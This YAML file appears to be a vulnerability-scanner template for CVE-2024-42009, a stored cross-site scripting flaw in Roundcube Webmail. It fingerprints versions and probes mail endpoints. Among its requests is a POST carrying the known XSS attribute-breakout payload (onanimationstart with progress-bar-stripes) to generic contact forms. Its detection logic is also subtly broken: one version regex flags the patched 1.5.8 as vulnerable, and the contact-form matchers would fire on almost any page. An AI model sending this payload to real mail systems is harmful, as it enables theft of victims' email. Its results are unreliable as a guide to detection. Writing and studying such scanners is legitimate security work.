id: CVE-2024-42009

info:
  name: Roundcube Webmail <= 1.6.7/1.5.7 - Cross-Site Scripting
  author: Deepam02
  severity: critical
  description: |
    Roundcube Webmail versions up to 1.5.7 and 1.6.x up to 1.6.7 contain a stored cross-site scripting vulnerability caused by desanitization in message_body() function in show.php. The vulnerability allows remote attackers to steal and send victim emails when the victim opens a crafted email. The issue occurs due to improper handling of HTML attributes in the html4inline() function that processes email content after sanitization. Attackers exploit a faulty regex pattern that incorrectly parses 'bgcolor' attributes, allowing malicious attributes like 'onanimationstart' to break out and execute JavaScript code using Bootstrap's 'progress-bar-stripes' animation.
  reference:
    - https://www.sonarsource.com/blog/government-emails-at-risk-critical-cross-site-scripting-vulnerability-in-roundcube-webmail/
    - https://github.com/roundcube/roundcubemail/releases/tag/1.6.8
    - https://github.com/roundcube/roundcubemail/releases/tag/1.5.8
    - https://nvd.nist.gov/vuln/detail/CVE-2024-42009
    - https://github.com/DaniTheHack3r/CVE-2024-42009-PoC
    - https://github.com/Bhanunamikaze/CVE-2024-42009
    - https://github.com/0xbassiouny1337/CVE-2024-42009
  classification:
    epss-score: 0.04301
    epss-percentile: 0.91374
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
    cvss-score: 9.6
    cve-id: CVE-2024-42009
    cwe-id: CWE-79
    cpe: cpe:2.3:a:roundcube:webmail:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 4
    vendor: roundcube
    product: webmail
    shodan-query: cpe:"cpe:2.3:a:roundcube:webmail"
    fofa-query: 'body="roundcube" || title="roundcube"'
  tags: cve,cve2024,xss,roundcube,webmail,critical,kev

http:
  - method: GET
    path:
      - "{{BaseURL}}"
      - "{{BaseURL}}/webmail/"
      - "{{BaseURL}}/roundcube/"

    host-redirects: true
    max-redirects: 3
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        name: roundcube-detected
        words:
          - "roundcube"
          - "Roundcube"
          - "rcmail"
        condition: or

      - type: regex
        name: vulnerable-version
        regex:
          - '"rcversion":\s*"(0\.[0-9]+\.[0-9]+|1\.[0-5]\.[0-9]+|1\.5\.[0-7]|1\.6\.[0-7])"'
          - 'roundcube[^>]*version[^>]*["\']?(0\.[0-9]+\.[0-9]+|1\.[0-5]\.[0-9]+|1\.5\.[0-7]|1\.6\.[0-7])["\']?'
          - 'name="generator"[^>]*content="[^"]*Roundcube[^"]*([01]\.[0-9]+\.[0-9]+|1\.[0-5]\.[0-9]+|1\.5\.[0-7]|1\.6\.[0-7])[^"]*"'
        condition: or

      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/?_task=mail&_action=show&_uid=1&_mbox=INBOX&_extwin=1"
      - "{{BaseURL}}/webmail/?_task=mail&_action=show&_uid=1&_mbox=INBOX&_extwin=1"
      - "{{BaseURL}}/roundcube/?_task=mail&_action=show&_uid=1&_mbox=INBOX&_extwin=1"

    matchers-condition: and
    matchers:
      - type: word
        name: mail-endpoint-response
        words:
          - "messagebody"
          - "Could not load message"
          - "rcmBody"
          - "_extwin"
          - "_action=show"
        condition: or

      - type: word
        name: roundcube-mail-ui
        words:
          - "rcmail"
          - "roundcube"
        condition: or

      - type: status
        status:
          - 200
          - 302
          - 404
          - 403

  - method: POST
    path:
      - "{{BaseURL}}/contact"
      - "{{BaseURL}}/contact.php"

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: |
      name=test&email=test@test.com&message=<body title="bgcolor=foo" name="bar style=animation-name:progress-bar-stripes onanimationstart=console.log('XSS') foo=bar>&recipient=admin@test.com

    matchers:
      - type: word
        name: contact-form-vulnerable
        words:
          - "contact"
          - "message"
          - "sent"
          - "success"
        condition: or

      - type: status
        status:
          - 200
          - 302

  - method: GET
    path:
      - "{{BaseURL}}/skins/elastic/deps/bootstrap.min.css"
      - "{{BaseURL}}/webmail/skins/elastic/deps/bootstrap.min.css"
      - "{{BaseURL}}/roundcube/skins/elastic/deps/bootstrap.min.css"

    matchers:
      - type: word
        name: bootstrap-animation-required
        words:
          - "progress-bar-stripes"
          - "@keyframes progress-bar-stripes"
        condition: or

      - type: status
        status:
          - 200

extractors:
  - type: regex
    name: roundcube-version
    group: 1
    regex:
      - '"rcversion":\s*"([0-9.]+)"'
      - 'roundcube[^>]*version[^>]*["\']?([0-9.]+)["\']?'
      - 'name="generator"[^>]*content="[^"]*Roundcube[^"]*([0-9.]+)[^"]*"'